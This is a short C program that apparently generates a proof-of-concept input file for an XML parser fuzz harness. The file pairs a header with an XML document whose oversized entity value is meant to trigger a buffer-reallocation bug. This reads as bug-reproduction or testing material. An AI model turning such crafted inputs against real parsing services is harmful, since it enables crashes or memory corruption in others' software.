#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write maxAlloc (4 bytes, big-endian, value 0x10000) */
    fputc(0x00, f); fputc(0x01, f); fputc(0x00, f); fputc(0x00, f);
    /* Write options (4 bytes, big-endian, value 0) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Write first backslash */
    fputc('\\', f);

    /* Write escaped URL "test.xml" (no backslashes to escape) */
    fwrite("test.xml", 1, 8, f);

    /* Write second backslash */
    fputc('\\', f);

    /* Write escaped XML content */
    fprintf(f, "<?xml version=\"1.0\"?>");
    fprintf(f, "<!DOCTYPE foo [");
    fprintf(f, "<!ENTITY x \"");
    /* Long entity value to trigger buffer reallocation */
    for (int i = 0; i < 10000; i++) {
        fputc('A', f);
    }
    fprintf(f, "\">");
    fprintf(f, "]");
    fprintf(f, "<root>&x;</root>");

    /* Write terminating backslash-newline */
    fputc('\\', f);
    fputc('\n', f);

    fclose(f);
    return 0;
}